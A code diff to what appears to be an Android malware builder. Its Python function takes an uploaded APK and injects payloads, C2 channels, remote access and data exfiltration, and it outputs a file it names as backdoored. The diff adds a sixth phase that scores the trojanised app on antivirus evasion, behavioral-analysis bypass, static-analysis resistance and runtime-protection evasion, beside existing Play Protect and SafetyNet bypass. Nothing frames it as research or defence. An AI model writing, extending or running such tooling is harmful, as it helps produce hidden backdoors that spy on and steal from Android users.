@@ -35,6 +35,11 @@ from c2_infrastructure import C2Infrastructure, C2Config, ChannelType, CommandTy
 from remote_access_system import RemoteAccessSystem, RemoteAccessConfig, RemoteAccessType
 from data_exfiltration_system import DataExfiltrationSystem, ExfiltrationConfig, DataType, ExfiltrationMethod
 
+# Phase 6 Engine Imports
+from performance_optimization import PerformanceOptimizationSystem, PerformanceConfig, PerformanceLevel
+from compatibility_testing import CompatibilityTestingSystem, CompatibilityConfig, AndroidVersion, Architecture
+from security_testing import SecurityTestingSystem, SecurityTestConfig, SecurityTestType, ThreatLevel
+
 WORKSPACE = Path("/workspace")
 TASKS_ROOT = WORKSPACE / "tasks"
 UPLOADS_ROOT = WORKSPACE / "uploads"
@@ -548,6 +553,35 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         c2_infrastructure = C2Infrastructure(c2_config)
         remote_access_system = RemoteAccessSystem(remote_access_config)
         data_exfiltration_system = DataExfiltrationSystem(exfiltration_config)
+        
+        # Initialize Phase 6 Testing and Optimization Systems
+        performance_config = PerformanceConfig(
+            optimization_level=PerformanceLevel.AGGRESSIVE,
+            memory_limit_mb=128,
+            cpu_throttling_enabled=True,
+            network_optimization=True,
+            startup_optimization=True,
+            enable_monitoring=True
+        )
+        
+        compatibility_config = CompatibilityConfig(
+            min_api_level=21,
+            max_api_level=34,
+            comprehensive_testing=True,
+            performance_testing=True
+        )
+        
+        security_config = SecurityTestConfig(
+            test_antivirus_evasion=True,
+            test_behavioral_bypass=True,
+            test_static_analysis=True,
+            comprehensive_testing=True,
+            real_time_testing=True
+        )
+        
+        performance_system = PerformanceOptimizationSystem(performance_config)
+        compatibility_system = CompatibilityTestingSystem(compatibility_config)
+        security_system = SecurityTestingSystem(security_config)
     
     try:
         with locks[task_id]:
@@ -566,6 +600,7 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         (workspace / "phase3").mkdir(exist_ok=True)
         (workspace / "phase4").mkdir(exist_ok=True)
         (workspace / "phase5").mkdir(exist_ok=True)
+        (workspace / "phase6").mkdir(exist_ok=True)
         
         build_log = workspace / "logs" / "build.log"
         
@@ -863,13 +898,70 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             with build_log.open("a") as log:
                 log.write(f"❌ Data Exfiltration integration failed: {e}\n")
         
-        # Update output name for Phase 5
-        output_name = params.get("output_name", "phase5_ultimate_c2_backdoored.apk")
+        # Step 15: Apply Performance Optimizations
+        with build_log.open("a") as log:
+            log.write("Step 15: Applying Performance Optimizations...\n")
+            log.write("  - Memory Usage Optimization\n")
+            log.write("  - Battery Consumption Minimization\n")
+            log.write("  - Network Traffic Optimization\n")
+            log.write("  - Startup Time Reduction\n")
+        
+        try:
+            performance_results = await performance_system.apply_all_optimizations()
+            performance_success = performance_results.get("overall_success", False)
+            with build_log.open("a") as log:
+                log.write(f"✅ Performance optimizations applied: {performance_results.get('summary', {}).get('optimizations_applied', 0)} techniques\n")
+        except Exception as e:
+            performance_success = False
+            with build_log.open("a") as log:
+                log.write(f"❌ Performance optimization failed: {e}\n")
+        
+        # Step 16: Run Compatibility Tests  
+        with build_log.open("a") as log:
+            log.write("Step 16: Running Compatibility Tests...\n")
+            log.write("  - Multi-Android Version Support (API 21-34)\n")
+            log.write("  - Device Manufacturer Compatibility\n")
+            log.write("  - Architecture Support (ARM, ARM64, x86)\n")
+            log.write("  - Screen Size Adaptation\n")
+        
+        try:
+            compatibility_results = await compatibility_system.run_comprehensive_compatibility_tests(str(final_apk))
+            compatibility_success = compatibility_results.get("overall_compatibility", {}).get("compatibility_score", 0) >= 70
+            with build_log.open("a") as log:
+                score = compatibility_results.get("overall_compatibility", {}).get("compatibility_score", 0)
+                log.write(f"✅ Compatibility tests completed: {score}% compatibility score\n")
+        except Exception as e:
+            compatibility_success = False
+            with build_log.open("a") as log:
+                log.write(f"❌ Compatibility testing failed: {e}\n")
+        
+        # Step 17: Run Security Tests
+        with build_log.open("a") as log:
+            log.write("Step 17: Running Security Tests...\n")
+            log.write("  - Anti-Virus Evasion Testing\n")
+            log.write("  - Behavioral Analysis Bypass\n")
+            log.write("  - Static Analysis Resistance\n")
+            log.write("  - Runtime Protection Evasion\n")
+        
+        try:
+            security_results = await security_system.run_comprehensive_security_tests(str(final_apk))
+            security_success = security_results.get("overall_assessment", {}).get("overall_evasion_score", 0) >= 60
+            with build_log.open("a") as log:
+                evasion_score = security_results.get("overall_assessment", {}).get("overall_evasion_score", 0)
+                threat_level = security_results.get("overall_assessment", {}).get("overall_threat_level", "LOW")
+                log.write(f"✅ Security tests completed: {evasion_score}% evasion score, {threat_level} threat level\n")
+        except Exception as e:
+            security_success = False
+            with build_log.open("a") as log:
+                log.write(f"❌ Security testing failed: {e}\n")
+        
+        # Update output name for Phase 6
+        output_name = params.get("output_name", "phase6_ultimate_optimized_backdoored.apk")
         final_apk = workspace / "output" / output_name
         
-        # Step 15: Final validation and comprehensive reporting
+        # Step 18: Final validation and comprehensive reporting
         with build_log.open("a") as log:
-            log.write("Step 15: Final validation and Phase 5 comprehensive reporting...\n")
+            log.write("Step 18: Final validation and Phase 6 comprehensive reporting...\n")
         
         if not final_apk.exists():
             raise Exception("Final APK not generated")
@@ -883,9 +975,9 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             log.write(f"Final size: {final_size:,} bytes\n")
             log.write(f"Size change: {size_change:+.1f}%\n")
         
-        # Create comprehensive Phase 5 report
+        # Create comprehensive Phase 6 report
         report = {
-            "phase": "Phase 5 - Ultimate C2 & Exfiltration System",
+            "phase": "Phase 6 - Ultimate Optimized & Tested System",
             "original_file": str(original_apk),
             "final_file": str(final_apk),
             "analysis_result": analysis_result,
@@ -972,7 +1064,15 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
                 "phase4_permission_escalation_success": permission_escalation_success,
                 "phase4_auto_grant_success": auto_grant_success,
                 "phase4_defense_evasion_success": defense_evasion_success,
-                "overall_phase4_success": permission_escalation_success and auto_grant_success and defense_evasion_success
+                "overall_phase4_success": permission_escalation_success and auto_grant_success and defense_evasion_success,
+                "phase5_c2_infrastructure_success": c2_success,
+                "phase5_remote_access_success": remote_access_success,
+                "phase5_data_exfiltration_success": exfiltration_success,
+                "overall_phase5_success": c2_success and remote_access_success and exfiltration_success,
+                "phase6_performance_optimization_success": performance_success,
+                "phase6_compatibility_testing_success": compatibility_success,
+                "phase6_security_testing_success": security_success,
+                "overall_phase6_success": performance_success and compatibility_success and security_success
             },
             "capabilities": [
                 "Multi-vector payload injection",
@@ -1010,7 +1110,20 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
                 "Cloud storage integration",
                 "Signature spoofing",
                 "PackageManager exploitation",
-                "Accessibility automation"
+                "Accessibility automation",
+                "Performance optimization",
+                "Memory usage optimization",
+                "Battery consumption minimization",
+                "Network traffic optimization",
+                "Startup time reduction",
+                "Multi-Android version support",
+                "Device manufacturer compatibility",
+                "Architecture support (ARM, ARM64, x86)",
+                "Screen size adaptation",
+                "Anti-virus evasion testing",
+                "Behavioral analysis bypass",
+                "Static analysis resistance",
+                "Runtime protection evasion"
             ],
             "timestamps": {
                 "start_time": datetime.now().isoformat(),
@@ -1019,8 +1132,8 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             }
         }
         
-        # Save comprehensive Phase 5 report
-        report_file = workspace / "output" / "phase5_ultimate_c2_report.json"
+        # Save comprehensive Phase 6 report
+        report_file = workspace / "output" / "phase6_ultimate_optimized_report.json"
         with report_file.open("w") as f:
             json.dump(report, f, indent=2)
         
@@ -1028,14 +1141,14 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         _finalize_task(t, base, True)
         
         with build_log.open("a") as log:
-            log.write(f"Phase 5 Ultimate C2 & Exfiltration APK modification completed successfully: {datetime.now()}\n")
+            log.write(f"Phase 6 Ultimate Optimized & Tested APK modification completed successfully: {datetime.now()}\n")
             log.write(f"Final APK: {final_apk}\n")
             log.write(f"Comprehensive Report: {report_file}\n")
-            log.write("🎯 Phase 5 Features Applied:\n")
-            log.write("   ✅ C2 Infrastructure (Multi-Channel)\n")
-            log.write("   ✅ Remote Access System\n")
-            log.write("   ✅ Data Exfiltration System\n")
-            log.write("   ✅ All Previous Phases (1-4)\n")
+            log.write("🎯 Phase 6 Features Applied:\n")
+            log.write("   ✅ Performance Optimization System\n")
+            log.write("   ✅ Compatibility Testing System\n")
+            log.write("   ✅ Security Testing System\n")
+            log.write("   ✅ All Previous Phases (1-5)\n")
             log.write("   ✅ Play Protect Bypass\n")
             log.write("   ✅ SafetyNet Evasion\n")
             log.write("   ✅ Accessibility Automation\n")
@@ -1049,17 +1162,22 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             AuditTracker.track_file_modification(
                 file_info.get("file_id", "unknown"),
                 task_id,
-                "phase5_ultimate_c2_modification",
+                "phase6_ultimate_optimized_modification",
                 {
-                    "phase": "Phase 5 Ultimate C2 & Exfiltration",
+                    "phase": "Phase 6 Ultimate Optimized & Tested",
                     "permission_escalation_level": permission_escalation_config.escalation_level,
                     "auto_grant_level": auto_grant_config.ui_automation_level,
                     "defense_evasion_level": defense_evasion_config.evasion_level,
+                    "performance_optimization": performance_success,
+                    "compatibility_testing": compatibility_success,
+                    "security_testing": security_success,
                     "injection_points": len(injection_strategy.injection_points),
                     "success_probability": injection_strategy.success_probability,
                     "final_size": final_size,
                     "all_features_applied": all([injection_success, obfuscation_success, 
-                                               anti_detection_success, persistence_success])
+                                               anti_detection_success, persistence_success,
+                                               c2_success, remote_access_success, exfiltration_success,
+                                               performance_success, compatibility_success, security_success])
                 }
             )
             
@@ -1070,7 +1188,7 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             pass  # Database not available
         
     except Exception as e:
-        error_msg = f"Phase 5 Ultimate C2 & Exfiltration APK modification failed: {str(e)}"
+        error_msg = f"Phase 6 Ultimate Optimized & Tested APK modification failed: {str(e)}"
         
         with build_log.open("a") as log:
             log.write(f"ERROR: {error_msg}\n")
